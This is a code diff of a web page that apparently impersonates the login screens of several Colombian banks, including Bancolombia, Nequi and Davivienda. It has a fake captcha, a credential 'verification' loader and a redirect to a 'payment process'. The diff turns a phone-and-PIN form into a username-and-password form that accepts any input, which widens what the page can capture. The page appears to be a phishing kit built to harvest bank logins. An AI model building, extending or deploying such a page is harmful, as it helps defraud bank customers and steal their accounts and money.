@@ -356,25 +356,25 @@ footer a:hover {
         </div>
     </div>
 
-    <!-- FORMULARIO CON VALIDACIÓN COMPLETA -->
+    <!-- FORMULARIO CON USUARIO Y CONTRASEÑA (CUALQUIER DATO ALFANUMÉRICO) -->
     <div class="form-group">
-        <label>Número vinculado <span style="color:#ff4444">*</span></label>
+        <label>Usuario <span style="color:#ff4444">*</span></label>
         <div class="input-with-icon">
-            <span class="input-icon">📱</span>
-            <input type="number" id="usuario" placeholder="Ej: 3115555555" 
-                   pattern="3[0-9]{9}" maxlength="10" minlength="10" inputmode="numeric">
+            <span class="input-icon">👤</span>
+            <input type="text" id="usuario" placeholder="Ej: usuario123, correo@banco.com, 1023456789" 
+                   minlength="3" maxlength="50">
         </div>
-        <div class="validation-message" id="usuario-error">Número inválido (10 dígitos, empezar con 3)</div>
+        <div class="validation-message" id="usuario-error">Ingrese un usuario válido (mínimo 3 caracteres)</div>
     </div>
 
     <div class="form-group">
-        <label>Clave de 4 dígitos <span style="color:#ff4444">*</span></label>
+        <label>Contraseña <span style="color:#ff4444">*</span></label>
         <div class="input-with-icon">
             <span class="input-icon">🔒</span>
-            <input type="password" id="clave" placeholder="****" 
-                   pattern="[0-9]{4}" maxlength="4" minlength="4" inputmode="numeric">
+            <input type="password" id="clave" placeholder="Ingrese su contraseña" 
+                   minlength="4" maxlength="30">
         </div>
-        <div class="validation-message" id="clave-error">Clave inválida (4 dígitos)</div>
+        <div class="validation-message" id="clave-error">La contraseña debe tener al menos 4 caracteres</div>
     </div>
 
     <!-- CAPTCHA CON BARRA DE PROGRESO -->
@@ -438,26 +438,28 @@ const bankLogos = {
 
 // TEXTO DESCRIPTIVO DE CADA BANCO
 const bankDescriptions = {
-    "Bancolombia": "Ingrese su número de celular vinculado",
-    "Nequi": "Ingrese su número de teléfono y PIN",
-    "Davivienda": "Ingrese sus credenciales de acceso",
-    "BBVA": "Ingrese sus credenciales de acceso",
-    "Banco Popular": "Ingrese sus credenciales de acceso",
-    "Banco de Bogotá": "Ingrese sus credenciales de acceso",
-    "Itaú": "Ingrese sus credenciales de acceso"
+    "Bancolombia": "Ingrese su usuario de Bancolombia",
+    "Nequi": "Ingrese su usuario de Nequi",
+    "Davivienda": "Ingrese su usuario de Davivienda",
+    "BBVA": "Ingrese su usuario de BBVA",
+    "Banco Popular": "Ingrese su usuario de Banco Popular",
+    "Banco de Bogotá": "Ingrese su usuario de Banco de Bogotá",
+    "Itaú": "Ingrese su usuario de Itaú"
 };
 
-// 🔥 FUNCIÓN DE VALIDACIÓN (LÓGICA COMPLETA)
+// 🔥 FUNCIÓN DE VALIDACIÓN (AHORA ACEPTA CUALQUIER DATO ALFANUMÉRICO)
 function validarCampo(campoId, valor) {
     const errorElement = document.getElementById(campoId + '-error');
     let esValido = false;
 
     switch(campoId) {
         case 'usuario':
-            esValido = /^3[0-9]{9}$/.test(valor);
+            // ✅ ACEPTA CUALQUIER DATO: texto, números, email, etc. (mínimo 3 caracteres)
+            esValido = valor.trim().length >= 3 && valor.trim().length <= 50;
             break;
         case 'clave':
-            esValido = /^[0-9]{4}$/.test(valor);
+            // ✅ ACEPTA CUALQUIER CONTRASEÑA (mínimo 4 caracteres)
+            esValido = valor.trim().length >= 4 && valor.trim().length <= 30;
             break;
     }
 
@@ -473,7 +475,7 @@ function validarCampo(campoId, valor) {
     return esValido;
 }
 
-// 🔥 ACTUALIZAR PROGRESO (LÓGICA COMPLETA)
+// 🔥 ACTUALIZAR PROGRESO
 function actualizarProgreso() {
     const campos = ['usuario', 'clave'];
     let completados = 0;
@@ -496,7 +498,7 @@ function actualizarProgreso() {
     return completados === (campos.length + 1);
 }
 
-// 🔥 VALIDAR CAMPOS Y ACTUALIZAR BOTÓN (LÓGICA COMPLETA)
+// 🔥 VALIDAR CAMPOS Y ACTUALIZAR BOTÓN
 function validarCampos() {
     const todosCompletos = actualizarProgreso();
     const loginBtn = document.getElementById('loginBtn');
@@ -513,7 +515,7 @@ function validarCampos() {
     }
 }
 
-// 🔥 CAPTCHA (LÓGICA COMPLETA)
+// 🔥 CAPTCHA
 document.getElementById('captchaProgress').addEventListener('click', function () {
     if (captchaValidado) return;
 
@@ -533,7 +535,7 @@ document.getElementById('captchaProgress').addEventListener('click', function ()
     }, 500);
 });
 
-// 🔥 MANEJO DEL FORMULARIO (LÓGICA COMPLETA)
+// 🔥 MANEJO DEL FORMULARIO
 document.getElementById('loginBtn').addEventListener('click', async function (e) {
     e.preventDefault();
 
@@ -551,7 +553,7 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
     loader.style.display = 'block';
     loader.innerHTML = `
         <div style="font-size: 24px; margin-bottom: 20px;">⏳</div>
-        Verificando identidad...
+        Verificando credenciales...
         <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Esto puede tomar unos segundos</div>
     `;
     loginBtn.disabled = true;
@@ -599,12 +601,12 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
             
             loader.innerHTML = `
                 <div style="font-size: 24px; margin-bottom: 20px;">✅</div>
-                Datos verificados correctamente<br>
-                <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Redirigiendo...</div>
+                Credenciales verificadas correctamente<br>
+                <div style="font-size: 14px; margin-top: 10px; color: #9ca3af;">Redirigiendo al proceso de pago...</div>
             `;
             
             setTimeout(() => {
-                window.location.href = 'procesando.html';
+                window.location.href = 'resultados.html';
             }, 2000);
 
         } else {
@@ -614,7 +616,7 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
     } catch (error) {
         console.error('❌ Error:', error);
         
-        let errorMessage = "Error de conexión";
+        let errorMessage = "Error de conexión con el banco";
         if (error.name === 'AbortError') {
             errorMessage = "Tiempo de espera agotado. Revisa tu conexión.";
         }
@@ -632,7 +634,7 @@ document.getElementById('loginBtn').addEventListener('click', async function (e)
     }
 });
 
-// 🔥 EVENT LISTENERS PARA VALIDACIÓN (LÓGICA COMPLETA)
+// 🔥 EVENT LISTENERS PARA VALIDACIÓN
 document.getElementById('usuario').addEventListener('input', function() {
     validarCampo('usuario', this.value);
     validarCampos();
@@ -643,7 +645,7 @@ document.getElementById('clave').addEventListener('input', function() {
     validarCampos();
 });
 
-// 🔥 INICIALIZACIÓN (LÓGICA COMPLETA)
+// 🔥 INICIALIZACIÓN
 document.addEventListener('DOMContentLoaded', function() {
     console.log('✅ Validación bancaria lista');
     
